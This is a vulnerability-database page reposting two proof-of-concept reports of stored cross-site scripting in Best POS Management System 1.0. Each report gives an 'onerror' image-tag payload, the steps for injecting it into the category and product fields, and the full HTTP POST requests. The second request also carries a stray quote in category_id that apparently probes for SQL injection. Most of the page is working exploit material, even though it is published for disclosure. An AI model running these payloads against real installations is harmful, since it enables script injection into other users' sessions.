---
title: Best POS Management System 1.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2023020031
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-18
fetch_date: 2025-10-04T07:19:23.950478
---

# Best POS Management System 1.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Best POS Management System 1.0 Cross Site Scripting** **2023.02.17**  Credit:  **[Ahmed Ismail](https://cxsecurity.com/author/Ahmed%2BIsmail/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")**  **[**Dork:** NA](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Stored Cross Site Scripting on Best pos Management System
# Google Dork: NA
# Date: 14/2/2023
# Exploit Author: Ahmed Ismail (@MrOz1l)
# Vendor Homepage:
https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html
# Software Link:
https://www.sourcecodester.com/sites/default/files/download/mayuri\_k/kruxton.zip
# Version: 1.0
# Tested on: Windows 11
# CVE : NA
# Description
Payload : "><img src=x onerror=prompt(document.domain);>
# POC :
1- Head to Add Category on
"http://localhost/kruxton/index.php?page=add-category"
2- On Name Parameter add our Payload "><img src=x
onerror=prompt(document.domain);>
3- After Adding This Category XSS will run
```
POST /kruxton/ajax.php?action=save\_category HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)
Gecko/20100101 Firefox/109.0
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data;
boundary=---------------------------7128987773293048653857517
Content-Length: 442
Origin: http://localhost
Connection: close
Referer: http://localhost/kruxton/index.php?page=add-category
Cookie: PHPSESSID=61ubuj4m01jk5tibc7banpldao
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
-----------------------------7128987773293048653857517
Content-Disposition: form-data; name="id"
-----------------------------7128987773293048653857517
Content-Disposition: form-data; name="name"
XSSPOC"><img src=x onerror=prompt(document.domain);>
-----------------------------7128987773293048653857517
Content-Disposition: form-data; name="description"
This is POC
-----------------------------7128987773293048653857517--
```
--------------------------------------
# Exploit Title: Stored Cross Site Scripting on Best pos Management System
# Google Dork: NA
# Date: 17/2/2023
# Exploit Author: Ahmed Ismail (@MrOz1l)
# Vendor Homepage:
https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html
# Software Link:
https://www.sourcecodester.com/sites/default/files/download/mayuri\_k/kruxton.zip
# Version: 1.0
# Tested on: Windows 11
# CVE : NA
Payload : "><img src=x onerror=prompt(document.domain);>
# POC :
1- Head to Add Category on
"http://localhost/kruxton/ajax.php?action=save\_product"
2- On Name Parameter add our Payload "><img src=x
onerror=prompt(document.domain);>
on description <img src=x onerror=prompt(2);>
3- After Adding This Category XSS will run
```
POST /kruxton/ajax.php?action=save\_product HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)
Gecko/20100101 Firefox/109.0
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data;
boundary=---------------------------11015616619250686693182759357
Content-Length: 830
Origin: http://localhost
Connection: close
Referer: http://localhost/kruxton/index.php?page=add-product
Cookie: PHPSESSID=<COOKIE>
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
-----------------------------11015616619250686693182759357
Content-Disposition: form-data; name="id"
-----------------------------11015616619250686693182759357
Content-Disposition: form-data; name="category\_id"
3'
-----------------------------11015616619250686693182759357
Content-Disposition: form-data; name="name"
XSSPOC2"><img src=x onerror=prompt(document.domain);>
-----------------------------11015616619250686693182759357
Content-Disposition: form-data; name="description"
XSSPOC2"><img src=x onerror=prompt(2);>
-----------------------------11015616619250686693182759357
Content-Disposition: form-data; name="price"
1122
-----------------------------11015616619250686693182759357
Content-Disposition: form-data; name="status"
1
-----------------------------11015616619250686693182759357--
```

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020031)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top